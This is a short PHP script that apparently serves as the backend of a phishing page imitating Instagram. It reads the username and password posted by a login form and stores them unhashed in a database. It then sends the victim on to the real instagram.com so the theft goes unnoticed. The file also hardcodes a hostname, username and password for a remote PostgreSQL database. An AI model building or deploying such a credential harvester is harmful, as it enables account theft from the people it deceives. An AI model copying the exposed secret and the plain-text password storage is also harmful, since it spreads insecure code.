<?php
session_start();

// --- Database configuration (local vs Render) ---
if (getenv('RENDER') === 'true') {
    // Render PostgreSQL
    $host = "dpg-d47nuju3jp1c73c53ci0-a.oregon-postgres.render.com";
    $port = "5432";
    $dbname = "security_asnz";
    $user = "imane";
    $pass = "AmzccrHQHBzv3jayighr0IIjZ28gfES5";
    $dsn = "pgsql:host=$host;port=$port;dbname=$dbname";
} else {
    // Local WAMP MySQL
    $host = "localhost";
    $port = "3306";
    $dbname = "security";
    $user = "root";
    $pass = "";
    $dsn = "mysql:host=$host;port=$port;dbname=$dbname;charset=utf8";
}

// --- Connect to the database ---
try {
    $conn = new PDO($dsn, $user, $pass);
    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch(PDOException $e) {
    die("Database connection failed: " . $e->getMessage());
}

// --- Handle form submission ---
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = isset($_POST['username']) ? trim($_POST['username']) : "";
    $password = isset($_POST['password']) ? trim($_POST['password']) : "";

    if (empty($email) || empty($password)) {
        die("Please fill in all fields.");
    }

    try {
        // Insert user into database
        $stmt = $conn->prepare("INSERT INTO users (email, password) VALUES (:email, :password)");
        $stmt->execute([
            ':email' => $email,
            ':password' => $password // plain text, you can use password_hash() if you want
        ]);

        // Store session
        $_SESSION['email'] = $email;

        // Redirect after successful submission
        header("Location: https://instagram.com"); // change this to your own page
        exit;
    } catch (PDOException $e) {
        die("Database error: " . $e->getMessage());
    }
} else {
    // If accessed directly
    header("Location: index.php");
    exit;
}
?>
